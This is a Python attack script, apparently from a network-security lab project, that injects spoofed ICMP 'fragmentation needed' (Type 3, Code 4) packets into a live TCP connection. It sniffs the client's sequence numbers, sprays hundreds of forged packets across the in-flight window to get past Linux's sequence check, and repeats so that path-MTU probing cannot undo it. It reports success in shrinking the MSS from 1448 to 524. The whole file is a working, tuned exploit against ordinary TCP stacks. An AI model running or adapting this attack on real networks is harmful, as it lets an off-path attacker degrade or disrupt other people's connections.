#!/usr/bin/env python3
"""
Phase P5 — inject the spoofed ICMP Type 3, Code 4 (PMTU reduction) packet.

Run from the attacker namespace:
    sudo ip netns exec attacker python3 attacks/inject_pmtu.py [--server-port 5201] [--mtu 576]

Sniffs the CLIENT's own outgoing segments to the server (the bulk sender
whose MSS we want to shrink — see build_packets.py's module docstring for
why it must be the client's own traffic, not the server's), then SPRAYS a
range of candidate sequence numbers around the sniffed value rather than
injecting just one.

Why spraying is necessary here (and wasn't for the reset attack): Linux's
tcp_v4_err() checks `between(seq, tp->snd_una, tp->snd_nxt)` for every
ICMP type/code, including Type 3/Code 4 — not just the reset case. For an
IDLE connection (P4's target) that window never moves, so one sniffed
value stays valid indefinitely. For an ACTIVE bulk transfer at ~12MB/s
with cwnd ~100 segments, the valid in-flight window is only cwnd*mss
(~100-150KB) wide and slides forward at the full transfer rate — by the
time a sniffed value has gone through tcpdump + Python + Scapy send(), it
has almost always already been ACKed and fallen out of the window.
Spraying a few hundred candidates spanning several MB, in steps smaller
than the in-flight window, reliably lands at least one inside the live
window regardless of that latency. Confirmed empirically (see
VM_COMMANDS.md): a single guess reliably fails (counted in
TcpExt:OutOfWindowIcmps); a spray of 300 packets at a 50KB step reliably
succeeds (observed mss drop from 1448 to 524, pmtu from 1500 to 576).

Repeats every --interval seconds for --duration seconds, since Linux's
own Packetization-Layer PMTU Discovery (tcp_mtu_probing) can otherwise
rediscover the true PMTU and undo the attack partway through a long
transfer.
"""
import argparse
import time

from scapy.all import send

from build_packets import CLIENT_IP, SERVER_IP, build_pmtu_packet, capture_live_state


def spray_once(iface, server_port, mtu, count, timeout, spray_step, spray_count):
    print(f"Sniffing {iface} for {CLIENT_IP} -> {SERVER_IP}:{server_port} traffic...")
    client_port, _server_port_seen, seq = capture_live_state(
        iface, CLIENT_IP, None, SERVER_IP, count, timeout
    )
    print(f"Captured: client_port={client_port} base_seq={seq}")

    pkts = [
        build_pmtu_packet(client_port, server_port, seq + i * spray_step, mtu)
        for i in range(spray_count)
    ]
    print(f"Spraying {spray_count} candidates, step={spray_step}B, "
          f"covering +{spray_count * spray_step / 1e6:.1f}MB (MTU={mtu})...")
    send(pkts, verbose=False)
    print("Sent.")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--iface", default="veth-at")
    parser.add_argument("--server-port", type=int, default=5201)
    parser.add_argument("--mtu", type=int, default=576)
    parser.add_argument("--count", type=int, default=1,
                         help="stop sniffing as soon as this many matching segments are seen")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--spray-step", type=int, default=50_000,
                         help="bytes between candidate sequence numbers (must be smaller "
                              "than the connection's in-flight window, i.e. cwnd*mss)")
    parser.add_argument("--spray-count", type=int, default=300,
                         help="how many candidate sequence numbers to try per round")
    parser.add_argument("--duration", type=int, default=1,
                         help="keep re-spraying for this many seconds")
    parser.add_argument("--interval", type=float, default=3.0,
                         help="seconds between re-spray rounds")
    args = parser.parse_args()

    deadline = time.time() + args.duration
    first = True
    while first or time.time() < deadline:
        first = False
        try:
            spray_once(args.iface, args.server_port, args.mtu, args.count, args.timeout,
                       args.spray_step, args.spray_count)
        except RuntimeError as e:
            print(f"  skip: {e}")
        if time.time() < deadline:
            time.sleep(args.interval)


if __name__ == "__main__":
    main()
